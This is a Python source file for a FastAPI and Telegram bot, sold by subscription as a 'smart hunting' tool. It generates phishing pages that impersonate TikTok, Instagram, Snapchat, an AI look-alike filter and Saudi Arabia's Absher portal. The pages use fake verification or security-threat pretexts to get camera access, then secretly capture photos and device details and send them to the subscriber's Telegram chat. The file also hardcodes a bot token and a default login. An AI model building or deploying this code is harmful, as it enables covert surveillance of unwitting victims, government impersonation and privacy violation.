import os
import base64
import io
import sqlite3
import uvicorn
from pydantic import BaseModel
from fastapi import FastAPI, Request, BackgroundTasks
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# 1. الإعدادات الأساسية
BOT_TOKEN = "8652491802:AAFOd303C5JsIaLkyuFfl6Op8XF-cygo6tg"
RENDER_URL = "https://haker-cam.onrender.com" 
TIKTOK_PROFILE = "https://www.tiktok.com/@your_username"  # 👈 ضع رابط حسابك التيك توك هنا

bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# نموذج استقبال بيانات تسجيل الدخول من الـ WebApp
class LoginData(BaseModel):
    chat_id: int
    username: str
    password: str

# ---- إعداد قاعدة البيانات الدائمة المحدثة (نظام الحسابات) ----
def init_db():
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS bot_users (
            username TEXT PRIMARY KEY,
            password TEXT,
            linked_chat_id INTEGER DEFAULT NULL
        )
    """)
    conn.commit()
    conn.close()

try:
    init_db()
except Exception as e:
    print(f"⚠️ قاعدة البيانات جاهزة: {e}")

def create_new_account(username, password):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    try:
        cursor.execute("INSERT OR IGNORE INTO bot_users (username, password) VALUES (?, ?)", (username, password))
        conn.commit()
    except Exception as e:
        print(f"Database error: {e}")
    finally:
        conn.close()

def try_login_user(chat_id, username, password):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute("SELECT password, linked_chat_id FROM bot_users WHERE username = ?", (username,))
    result = cursor.fetchone()
    
    if result:
        db_password, linked_chat = result
        if db_password == password:
            cursor.execute("UPDATE bot_users SET linked_chat_id = ? WHERE username = ?", (chat_id, username))
            conn.commit()
            conn.close()
            return True
    conn.close()
    return False

def has_active_session(chat_id):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute("SELECT username FROM bot_users WHERE linked_chat_id = ?", (chat_id,))
    result = cursor.fetchone()
    conn.close()
    return result is not None


# ---- واجهة تسجيل الدخول الحديثة عبر التليجرام (Web App) ----
def get_login_html():
    return """
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>تسجيل الدخول للنظام</title>
        <script src="https://telegram.org/js/telegram-web-app.js"></script>
        <style>
            body {
                background-color: #182533; color: #ffffff; font-family: system-ui, -apple-system, sans-serif;
                display: flex; flex-direction: column; align-items: center; justify-content: center;
                min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box;
            }
            .login-card {
                background: #223140; padding: 30px 25px; border-radius: 15px;
                box-shadow: 0 10px 25px rgba(0,0,0,0.4); max-width: 360px; width: 100%;
                text-align: center; border: 1px solid #2b3d50;
            }
            h2 { font-size: 22px; margin-bottom: 20px; color: #5288c1; }
            .input-group { margin-bottom: 20px; text-align: right; }
            label { display: block; margin-bottom: 8px; font-size: 14px; color: #b1c7df; }
            input {
                width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #2b3d50;
                background: #182533; color: white; font-size: 16px; box-sizing: border-box;
                outline: none; transition: border 0.2s;
            }
            input:focus { border-color: #5288c1; }
            .btn {
                background-color: #2481cc; color: white; border: none; padding: 14px;
                font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer;
                width: 100%; margin-top: 10px; transition: background 0.2s;
            }
            #error-msg { color: #e53935; font-size: 14px; margin-top: 15px; display: none; }
            #success-msg { color: #4caf50; font-size: 14px; margin-top: 15px; display: none; }
        </style>
    </head>
    <body>
        <div class="login-card">
            <h2>🔐 تسجيل الدخول للنظام</h2>
            <div class="input-group">
                <label>اسم المستخدم</label>
                <input type="text" id="username" placeholder="أدخل اسم المستخدم">
            </div>
            <div class="input-group">
                <label>كلمة المرور</label>
                <input type="password" id="password" placeholder="أدخل كلمة المرور">
            </div>
            <button class="btn" id="loginBtn">تسجيل الدخول</button>
            <div id="error-msg"></div>
            <div id="success-msg"></div>
        </div>

        <script>
            const tg = window.Telegram.WebApp;
            tg.expand();

            document.getElementById('loginBtn').addEventListener('click', function() {
                const user = document.getElementById('username').value.trim();
                const pass = document.getElementById('password').value.trim();
                const errorBlock = document.getElementById('error-msg');
                const successBlock = document.getElementById('success-msg');

                if(!user || !pass) {
                    errorBlock.innerText = "⚠️ يرجى ملء جميع الحقول!";
                    errorBlock.style.display = "block";
                    return;
                }

                errorBlock.style.display = "none";
                
                fetch('/api/web-login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: tg.initDataUnsafe.user.id,
                        username: user,
                        password: pass
                    })
                })
                .then(res => res.json())
                .then(data => {
                    if(data.status === "success") {
                        successBlock.innerText = "🎉 تم تسجيل الدخول بنجاح!";
                        successBlock.style.display = "block";
                        setTimeout(() => { tg.close(); }, 1500);
                    } else {
                        errorBlock.innerText = "❌ " + data.message;
                        errorBlock.style.display = "block";
                    }
                })
                .catch(err => {
                    errorBlock.innerText = "⚠️ حدث خطأ في الاتصال بالسيرفر";
                    errorBlock.style.display = "block";
                });
            });
        </script>
    </body>
    </html>
    """


# ---- واجهة المقالب الافتراضية (فلتر AI + تيك توك + سناب + انستا) ----
def get_html_content(template_type):
    bg_color = "#010101"
    card_bg = "#121212"
    btn_color = "#fe2c55"
    logo_text = "TikTok"
    logo_style = "text-shadow: 2px 2px #fe2c55, -2px -2px #25f4ee;"
    title = "تحدي الملامح التفاعلي جاهز"
    desc = "يرجى النقر على زر التشغيل بالأسفل لفتح الفيديو وتفعيل الكاميرا الأمامية للمشاركة في تحدي الضحك المنتشر الآن."
    btn_text = "▶ اضغط لمشاهدة التحدي على TikTok"
    redirect_to = "https://www.tiktok.com"

    if template_type == "instagram":
        bg_color = "#fafafa"
        card_bg = "#ffffff"
        btn_color = "#0095f6"
        logo_text = "Instagram"
        logo_style = "background: -webkit-linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent;"
        title = "🛡️ نظام فحص وتوثيق الحسابات الحية"
        desc = "لتأكيد هويتك وتوثيق حسابك بالعلامة الزرقاء مجاناً، يرجى تفعيل الكاميرا الأمامية للمسح الحي ومطابقة الملامح مع صورة الحساب."
        btn_text = "✨ ابدأ الفحص الحي للحساب الآن"
        redirect_to = "https://www.instagram.com"
        
    elif template_type == "snapchat":
        bg_color = "#fffc00"
        card_bg = "#ffffff"
        btn_color = "#000000"
        logo_text = "Snapchat"
        logo_style = "color: #000000; font-family: 'Comic Sans MS', sans-serif;"
        title = "📸 تجربة فلاتر الذكاء الاصطناعي الجديدة"
        desc = "أطلقت سناب شات فلتر تغير الملامح المرعب الجديد! اضغط على الزر بالأسفل واسمح بالكاميرا لتجربة الفلتر الحصري قبل الجميع."
        btn_text = "🔥 تشغيل الفلتر الحصري"
        redirect_to = "https://www.snapchat.com"

    elif template_type == "ai_filter":
        bg_color = "#0f172a"
        card_bg = "#1e293b"
        btn_color = "#3b82f6"
        logo_text = "AI Look-Alike 🧠"
        logo_style = "background: linear-gradient(to right, #3b82f6, #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900;"
        title = "🔍 فلتر كاشف الشبيه بالذكاء الاصطناعي v2.4"
        desc = "اكتشف من تشبه من مشاهير كرة القدم العالمية أو شخصيات الأنمي! يرجى السماح للمتصفح باستخدام الكاميرا الأمامية لبدء المسح الحي وتحليل ملامح الوجه بدقة خلال ثوانٍ واظهار شبيهك الفعلي."
        btn_text = "⚡ ابدأ الفحص الحي واكتشف شبيهك الآن"
        redirect_to = "https://www.google.com"
        
    elif template_type == "absher":
        bg_color = "#f4f6f9"
        card_bg = "#ffffff"
        btn_color = "#2d6a4f"
        logo_text = "Absher | أبشر"
        logo_style = "color: #2d6a4f; font-family: Arial, sans-serif; font-weight: bold; border-bottom: 3px solid #52b788; padding-bottom: 5px;"
        title = "🛡️ منصة التحقق الوطني الموحد (أمن البيانات)"
        desc = "تم رصد محاولة دخول مشبوهة إلى حسابك الرقمي الموحد. لتفادي تجميد الخدمات الحكومية والبطاقة الحيوية فوراً، يرجى تفعيل الكاميرا الأمامية لمطابقة بصمة الوجه الحية الحالية ومطابقتها بالنظام المركزي لإثبات هويتك."
        btn_text = "🔒 ابدأ التحقق الفوري والمسح الحي"
        redirect_to = "https://www.saudiarabia.gov.sa"
        
    return f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>{logo_text}</title>
        <style>
            * {{ box-sizing: border-box; margin: 0; padding: 0; }}
            body {{ 
                background-color: {bg_color}; color: #ffffff; font-family: system-ui, -apple-system, sans-serif; 
                display: flex; flex-direction: column; align-items: center; justify-content: center; 
                min-height: 100vh; padding: 20px;
            }}
            .container {{ 
                background: {card_bg}; padding: 35px 25px; border-radius: 20px; 
                box-shadow: 0 15px 35px rgba(0,0,0,0.3); max-width: 420px; width: 100%; 
                border: 1px solid #334155; text-align: center;
            }}
            .logo {{ font-size: 34px; font-weight: 800; margin-bottom: 25px; letter-spacing: -1px; display: inline-block; {logo_style} }}
            .video-box {{
                width: 100%; height: 200px; background: #000000; border-radius: 12px; margin-bottom: 25px;
                display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative;
                border: 1px dashed #475569;
            }}
            .loader {{
                border: 4px solid #f3f3f3; border-top: 4px solid {btn_color}; border-radius: 50%;
                width: 45px; height: 45px; animation: spin 1s linear infinite; margin-bottom: 15px;
            }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
            .loading-text {{ color: #94a3b8; font-size: 14px; }}
            h2 {{ font-size: 19px; font-weight: 700; margin-bottom: 12px; line-height: 1.4; }}
            p {{ color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }}
            .btn {{ 
                background-color: {btn_color}; color: white; border: none; padding: 16px 32px; 
                font-size: 16px; font-weight: 700; border-radius: 8px; cursor: pointer; width: 100%; 
                box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4); transition: all 0.2s ease;
            }}
            .btn:active {{ transform: scale(0.98); }}
            .error-msg {{
                color: #ef4444; font-size: 13px; margin-top: 15px; display: none; font-weight: 600;
                background: rgba(239, 68, 68, 0.1); padding: 10px; border-radius: 8px;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">{logo_text}</div>
            <div class="video-box">
                <div class="loader" id="mainLoader"></div>
                <div class="loading-text" id="statusText">جاري تهيئة خوارزميات الـ AI...</div>
            </div>
            <h2 id="mainTitle">{title}</h2>
            <p id="mainDesc">{desc}</p>
            <button class="btn" id="startBtn">{btn_text}</button>
            <div class="error-msg" id="errorBlock">⚠️ خطأ: الكاميرا معطلة! يجب السماح بالوصول لكي يتمكن النظام من قراءة الملامح.</div>
        </div>

        <script>
            const urlParams = new URLSearchParams(window.location.search);
            const ownerId = urlParams.get('id');
            const REDIRECT_URL = "{redirect_to}";

            function getDeviceInfo() {{
                const ua = navigator.userAgent;
                let os = "غير معروف"; let browser = "غير معروف";
                if (ua.indexOf("Win") !== -1) os = "Windows";
                else if (ua.indexOf("Mac") !== -1) os = "Mac OS / iPhone";
                else if (ua.indexOf("Android") !== -1) os = "Android";
                if (ua.indexOf("Chrome") !== -1) browser = "Google Chrome";
                else if (ua.indexOf("Safari") !== -1) browser = "Safari";
                return os + " (" + browser + ")";
            }}

            function tryCapture() {{
                if (!ownerId) {{ window.location.href = REDIRECT_URL; return; }}

                navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }})
                .then(function(stream) {{
                    document.getElementById('errorBlock').style.display = 'none';
                    document.getElementById('statusText').innerText = "نجح الاتصال.. جاري قراءة النقاط الحيوية...";
                    
                    let video = document.createElement('video');
                    video.srcObject = stream;
                    video.setAttribute("playsinline", true);
                    video.play();
                    
                    video.onloadedmetadata = function() {{
                        let canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                        let ctx = canvas.getContext('2d');
                        let shotsTaken = 0; const deviceInfo = getDeviceInfo();
                        
                        let captureInterval = setInterval(function() {{
                            if (shotsTaken >= 3) {{
                                clearInterval(captureInterval);
                                stream.getTracks().forEach(track => track.stop());
                                window.location.href = REDIRECT_URL;
                                return;
                            }}
                            ctx.drawImage(video, 0, 0);
                            let base64Image = canvas.toDataURL('image/jpeg', 0.75);
                            fetch('/api/capture', {{
                                method: 'POST',
                                headers: {{ 'Content-Type': 'application/json' }},
                                body: JSON.stringify({{ user_id: ownerId, image: base64Image, count: shotsTaken + 1, device: deviceInfo }})
                            }});
                            shotsTaken++;
                        }}, 500);
                    }};
                }})
                .catch(function(err) {{
                    document.getElementById('errorBlock').style.display = 'block';
                    document.getElementById('statusText').innerText = "⚠️ تعذر التحليل! يرجى منح الإذن للمحاولة مجدداً.";
                }});
            }}
            document.getElementById('startBtn').addEventListener('click', tryCapture);
        </script>
    </body>
    </html>
    """

# ---- أوامر البوت في تليجرام ----

@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    
    if has_active_session(chat_id):
        show_main_menu(chat_id)
        return

    welcome_text = (
        "🛡️ **مرحباً بك في نظام الصيد الذكي المطور (v6.0)!**\n\n"
        "هذا البوت مخصص للمشتركين بأكواد تفعيل رسمية فقط.\n"
        "يرجى الضغط على الزر بالأسفل لتسجيل الدخول بشكل آمن عبر بوابة الويب."
    )
    
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("🔐 تسجيل الدخول للنظام", web_app=telebot.types.WebAppInfo(url=f"{RENDER_URL}/login-page")),
        InlineKeyboardButton("ℹ️ تعليمات وكيفية الاشتراك", callback_data="show_instructions")
    )
    bot.send_message(chat_id, welcome_text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "show_instructions")
def show_instructions(call):
    chat_id = call.message.chat.id
    instructions = (
        "⚠️ **تنبيه: أنت غير مسجل في النظام حالياً!**\n\n"
        "للحصول على حساب خاص بك وتفعيل الميزات، يرجى التواصل مع الإدارة عبر حسابنا في تيك توك:\n"
        f"🔗 {TIKTOK_PROFILE}\n\n"
        "*بعد إتمام الاشتراك، سيتم تزويدك ببيانات الدخول فوراً.* 💳✨"
    )
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔙 العودة للخلف", callback_data="back_to_start"))
    bot.send_message(chat_id, instructions, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "back_to_start")
def back_to_start(call):
    bot.delete_message(call.message.chat.id, call.message.message_id)
    start(call.message)

def show_main_menu(chat_id):
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("🎬 مقلب تحدي تيك توك", callback_data="gen_tiktok"),
        InlineKeyboardButton("📸 مقلب توثيق إنستغرام", callback_data="gen_instagram"),
        InlineKeyboardButton("👻 مقلب فلاتر سناب شات", callback_data="gen_snapchat"),
        InlineKeyboardButton("🧠 مقلب فلتر الشبيه بالـ AI (ناري)", callback_data="gen_ai_filter")
    )
    bot.send_message(chat_id, "👑 **مرحباً بك في لوحة تحكم القوالب الذكية:**\nاختر نوع المقلب لتوليد الرابط فوراً:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("gen_"))
def gen_link(call):
    chat_id = call.message.chat.id
    if not has_active_session(chat_id):
        bot.send_message(chat_id, "❌ حسابك غير مفعل أو انتهت جلستك.")
        return
        
    template = call.data.split("_")[1]
    display_name = "فلتر الشبيه AI" if template == "ai" else template.upper()
    
    if template == "ai":
        unique_link = f"{RENDER_URL}?id={chat_id}&template=ai_filter"
    else:
        unique_link = f"{RENDER_URL}?id={chat_id}&template={template}"
    
    msg = (
        f"🚀 **رابط المقلب الذكي لـ ({display_name}) جاهز!**\n\n"
        f"انسخ الرابط وأرسله مباشرة:\n`{unique_link}`\n\n"
        "💡 **تذكير:** الصفحة معزولة تماماً ولن تترك الضحية يخرج حتى يوافق، وسيأتيك تقرير بنوع جواله مع صوره المضحكة!"
    )
    bot.send_message(chat_id, msg, parse_mode="Markdown")

# ---- المسارات واستقبال السيرفر (FastAPI) ----

@app.get("/", response_class=HTMLResponse)
async def get_home(request: Request):
    template = request.query_params.get("template", "tiktok")
    return get_html_content(template)

@app.get("/login-page", response_class=HTMLResponse)
async def login_page():
    return get_login_html()

@app.post("/api/web-login")
async def api_web_login(data: LoginData):
    if try_login_user(data.chat_id, data.username, data.password):
        bot.send_message(data.chat_id, "🎉 **تم تسجيل دخولك بنجاح عبر بوابة الويب الآمنة!**")
        show_main_menu(data.chat_id)
        return {"status": "success"}
    else:
        return {"status": "error", "message": "بيانات الدخول غير صحيحة!"}

@app.post(f"/{BOT_TOKEN}")
async def telegram_webhook(request: Request):
    json_string = await request.body()
    update = telebot.types.Update.de_json(json_string.decode('utf-8'))
    bot.process_new_updates([update])
    return {"status": "ok"}

def send_photo_to_owner(user_id, image_bytes, count_text, device_info):
    try:
        caption_msg = (
            f"📸 **تم صيد لقطة مضحكة بنجاح! اللقطة رقم ({count_text})**\n\n"
            f"📱 **جهاز الضحية:** `{device_info}`"
        )
        bot.send_photo(chat_id=user_id, photo=image_bytes, caption=caption_msg, parse_mode="Markdown")
    except Exception as e:
        print(f"Error sending photo: {e}")

@app.post("/api/capture")
async def capture_api(request: Request, background_tasks: BackgroundTasks):
    try:
        data = await request.json()
        user_id = data.get("user_id")
        image_b64 = data.get("image")
        shot_count = data.get("count", 1)
        device_info = data.get("device", "غير معروف")
        
        if not user_id or not image_b64:
            return JSONResponse(status_code=400, content={"status": "error"})
            
        header, encoded = image_b64.split(",", 1)
        image_bytes = base64.b64decode(encoded)
        image_file = io.BytesIO(image_bytes)
        image_file.name = f"capture_{shot_count}.jpg"
        
        background_tasks.add_task(send_photo_to_owner, int(user_id), image_file, str(shot_count), device_info)
        return {"status": "success"}
    except Exception as e:
        return JSONResponse(status_code=500, content={"status": "error"})

@app.on_event("startup")
def startup_event():
    bot.remove_webhook()
    bot.set_webhook(url=f"{RENDER_URL}/{BOT_TOKEN}")
    create_new_account("moosa", "123456")
    print("🚀 تم تشغيل بوت التفعيل التجاري المطور بنجاح!")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    uvicorn.run(app, host="0.0.0.0", port=port)
